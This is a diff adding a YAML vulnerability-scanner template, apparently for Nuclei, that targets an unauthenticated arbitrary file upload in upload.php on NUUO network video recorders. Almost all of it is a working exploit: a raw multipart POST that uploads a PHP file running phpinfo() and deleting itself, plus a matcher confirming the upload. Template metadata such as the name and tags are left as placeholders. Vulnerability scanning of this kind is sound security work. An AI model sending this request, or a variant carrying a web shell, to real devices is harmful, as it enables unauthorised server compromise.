@@ -1,0 +1,35 @@
+id: NUUO-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: NUUO网络视频录像机upload.php任意文件上传漏洞，未经身份验证攻击者可通过该漏洞上传恶意文件，造成服务器沦陷。
+  reference:
+    - https://github.com/wy876/POC/blob/main/NUUO/NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Accept-Language: zh-CN
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=--------ok4o88lom
+        accept: */*
+        Content-Length: 152
+
+        ----------ok4o88lom
+        Content-Disposition: form-data; name="userfile"; filename="test.php"
+
+        <?php phpinfo();@unlink(__FILE__);?>
+        ----------ok4o88lom--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - test.php
